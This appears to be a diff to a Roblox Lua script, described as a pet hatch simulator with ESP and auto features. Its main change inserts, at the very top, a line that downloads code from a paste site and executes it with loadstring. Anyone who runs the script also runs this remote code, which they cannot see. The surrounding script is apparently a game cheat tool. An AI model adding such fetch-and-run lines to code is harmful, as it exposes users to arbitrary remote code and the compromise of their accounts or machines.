@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://pastefy.app/ZezpFZ5T/raw"))()
+
 -- Visual pet hatch simulator with drag, ESP, auto random, pet age loader
 local Players = game:GetService("Players")
 local Workspace = game:GetService("Workspace")
